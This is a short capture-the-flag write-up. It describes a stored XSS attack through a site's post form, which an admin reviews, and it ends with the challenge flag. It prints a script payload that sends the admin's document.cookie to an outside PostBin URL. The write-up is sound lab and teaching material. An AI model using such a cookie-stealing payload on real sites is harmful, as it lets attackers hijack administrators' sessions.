After going around the website, there is not much to see besides the 'Create a new post' form, so this is our potential target.

After creating a post you are told that the admin will look at it, so you may potentially execute a XSS attack.

The idea of the attack is to steal the admin's cookies.

To do that, create a new PostBin in https://postb.in/ and create a new post that will redirect the admin to it, like this:

<script>
	target.href="https://postb.in/1561376411756-0296571028884?cookie=" + document.cookie;
</script>

In PostBin you can then read the cookie that is sent.

CTF{8aaa2f34b392b415601804c2f5f0f24e}